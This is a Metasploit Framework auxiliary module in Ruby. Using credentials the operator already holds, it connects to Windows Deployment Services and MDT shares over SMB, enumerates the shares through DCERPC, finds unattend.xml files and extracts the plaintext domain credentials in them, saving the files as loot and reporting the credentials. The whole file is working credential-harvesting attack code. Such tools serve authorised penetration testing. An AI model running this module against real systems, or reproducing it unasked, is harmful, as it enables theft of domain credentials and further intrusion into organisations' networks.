#
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/dcerpc'
require 'rex/parser/unattend'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::Remote::SMB::Authenticated
  include Msf::Exploit::Remote::DCERPC

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
      'Description'    => %q{
            Used after discovering domain credentials with aux/scanner/dcerpc/windows_deployment_services
            or if you already have domain credentials. Will attempt to connect to the RemInst share and any
            Microsoft Deployment Toolkit shares (identified by comments), search for unattend files, and recover credentials.
      },
      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSDN', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
          [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html'],
        ],
      ))

    register_options(
      [
        Opt::RPORT(445),
        OptString.new('SMBDomain', [ false, "SMB Domain", '']),
      ], self.class)

    deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
  end


  def share_type(val)
      stypes = [
          'DISK',
          'PRINTER',
          'DEVICE',
          'IPC',
          'SPECIAL',
          'TEMPORARY'
      ]

      if val > (stypes.length - 1)
          return 'UNKNOWN'
      end

      stypes[val]
  end

  # Stolen from enumshares - Tried refactoring into simple client, but the two methods need to go in EXPLOIT::SMB and EXPLOIT::DCERPC
  # and then the lanman method calls the RPC method. Suggestions where to refactor to welcomed!
  def srvsvc_netshareenum
      simple.connect("IPC$")
      handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\srvsvc"])
      begin
          dcerpc_bind(handle)
      rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
          print_error("#{rhost} : #{e.message}")
          return
      end

      stubdata =
          NDR.uwstring("\\\\#{rhost}") +
          NDR.long(1)  #level

      ref_id = stubdata[0,4].unpack("V")[0]
      ctr = [1, ref_id + 4 , 0, 0].pack("VVVV")

      stubdata << ctr
      stubdata << NDR.align(ctr)
      stubdata << ["FFFFFFFF"].pack("H*")
      stubdata << [ref_id + 8, 0].pack("VV")
      response = dcerpc.call(0x0f, stubdata)
      res = response.dup
      win_error = res.slice!(-4, 4).unpack("V")[0]
      if win_error != 0
          raise "DCE/RPC error : Win_error = #{win_error + 0}"
      end
      #remove some uneeded data
      res.slice!(0,12) # level, CTR header, Reference ID of CTR
      share_count = res.slice!(0, 4).unpack("V")[0]
      res.slice!(0,4) # Reference ID of CTR1
      share_max_count = res.slice!(0, 4).unpack("V")[0]

      raise "Dce/RPC error : Unknow situation encountered count != count max (#{share_count}/#{share_max_count})" if share_max_count != share_count

      types = res.slice!(0, share_count * 12).scan(/.{12}/n).map{|a| a[4,2].unpack("v")[0]}  # RerenceID / Type / ReferenceID of Comment

      share_count.times do |t|
          length, offset, max_length = res.slice!(0, 12).unpack("VVV")
          raise "Dce/RPC error : Unknow situation encountered offset != 0 (#{offset})" if offset != 0
          raise "Dce/RPC error : Unknow situation encountered length !=max_length (#{length}/#{max_length})" if length != max_length
          name = res.slice!(0, 2 * length).gsub('\x00','')
          res.slice!(0,2) if length % 2 == 1 # pad

          comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack("VVV")
          raise "Dce/RPC error : Unknow situation encountered comment_offset != 0 (#{comment_offset})" if comment_offset != 0
          if comment_length != comment_max_length
              raise "Dce/RPC error : Unknow situation encountered comment_length != comment_max_length (#{comment_length}/#{comment_max_length})"
          end
          comment = res.slice!(0, 2 * comment_length).gsub('\x00','')
          res.slice!(0,2) if comment_length % 2 == 1 # pad

          @shares << [ name, share_type(types[t]), comment]
      end
  end

  def run_host(ip)

      @shares = []
      deploy_shares = []

      begin
        connect
        smb_login
        srvsvc_netshareenum

        @shares.each do |share|
          # I hate unicode, couldn't find any other way to get these to compare!
          # look at iconv for 1.8/1.9 compatability?
          if (share[0].unpack('H*') == "REMINST\x00".encode('utf-16LE').unpack('H*')) ||
            (share[2].unpack('H*') == "MDT Deployment Share\x00".encode('utf-16LE').unpack('H*'))

            print_status("#{ip}:#{rport} #{share[0]} - #{share[1]} - #{share[2]}")
            deploy_shares << share[0]
          end
        end

        deploy_shares.each do |deploy_share|
          query_share(ip, deploy_share)
        end

      rescue ::Interrupt
          raise $!
      end
  end

  def query_share(rhost, deploy_share)
    share_path = "\\\\#{rhost}\\#{deploy_share}"
    print_status("Enumerating #{share_path}")
    table = Rex::Ui::Text::Table.new({
      'Header' => share_path,
      'Indent' => 1,
      'Columns' => ['Path', 'Type', 'Domain',  'Username', 'Password']
    })

    creds_found = false

    # ruby 1.8 compat?
    share = deploy_share.force_encoding('utf-16LE').encode('ASCII-8BIT').strip

    begin
      simple.connect(share)
    rescue ::Exception => e
      print_error("#{share_path} - #{e}")
      return
    end

    results = simple.client.file_search("\\", /unattend.xml$/i, 10)

    results.each do |file_path|
      file = simple.open(file_path, 'o').read()

      unless file.nil?
        loot_unattend(file)

        creds = parse_client_unattend(file)
        creds.each do |cred|
          unless cred.empty?
            unless cred['username'].nil? || cred['password'].nil?
              print_good("Retrived #{cred['type']} credentials from #{file_path}")
              creds_found = true
              domain = ""
              domain = cred['domain'] if cred['domain']
              report_creds(domain, cred['username'], cred['password'])
              table << [file_path, cred['type'], domain, cred['username'], cred['password']]
            end
          end
        end
      end
    end

    if creds_found
      print_line
      table.print
      print_line
    else
      print_error("No Unattend files found.")
    end
  end

  def parse_client_unattend(data)
    begin
      xml = REXML::Document.new(data)

      rescue REXML::ParseException => e
          print_error("Invalid XML format")
          vprint_line(e.message)
      end

    return Rex::Parser::Unattend.parse(xml).flatten
  end

  def loot_unattend(data)
      return if data.empty?
      p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
      print_status("Raw version saved as: #{p}")
  end

  def report_creds(domain, user, pass)
    report_auth_info(
        :host  => rhost,
        :port => 445,
        :sname => 'smb',
        :proto => 'tcp',
        :source_id => nil,
        :source_type => "aux",
        :user => "#{domain}\\#{user}",
        :pass => pass)
  end
end
